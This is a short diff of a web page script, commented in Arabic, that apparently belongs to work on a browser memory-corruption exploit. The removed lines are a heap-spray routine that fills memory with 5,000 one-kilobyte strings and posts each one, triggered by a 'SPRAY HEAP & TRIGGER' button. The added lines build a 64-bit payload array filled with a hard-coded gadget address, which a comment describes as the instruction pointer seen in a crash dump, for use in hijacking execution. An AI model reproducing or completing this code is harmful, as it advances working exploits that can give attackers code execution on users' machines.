@@ -7,23 +7,18 @@
     
     
     
-<script>
-    // 1. توليد "قطع" صغيرة من الذاكرة لملء الـ Heap
-    // نحاول زرع بيانات محددة يمكن البحث عنها لاحقاً في الذاكرة
-    let spray = [];
-    function heapSpray() {
-        for (let i = 0; i < 5000; i++) {
-            let chunk = "S".repeat(1024); // 1KB
-            spray.push(chunk);
-            
-            // إرسال رسالة صغيرة مع كل قطعة
-            window.postMessage({id: i, data: chunk}, '*');
-        }
-    }
-    
-    // زر التنفيذ
-    document.body.innerHTML = '<button onclick="heapSpray()" style="padding:50px;">SPRAY HEAP & TRIGGER</button>';
-</script>
+// سنقوم بإنشاء Payload يحتوي على عناوين (Addresses) بدلاً من حرف 'A'
+const payload = new BigInt64Array(0x1000); 
+
+// العنوان الذي سيقفز إليه المعالج (يجب أن يكون عنواناً لـ Gadget)
+const targetGadget = 0x000000082039d566n; // هذا هو الـ RIP الذي ظهر في الـ Dump
+
+for (let i = 0; i < payload.length; i++) {
+    payload[i] = targetGadget; 
+}
+
+// الآن نستخدم هذا الـ payload في الـ sourceURL بدل السلسلة النصية
+// ملاحظة: قد نحتاج لتحويله إلى String أو Blob ليتوافق مع النوع المتوقع
 
 
 
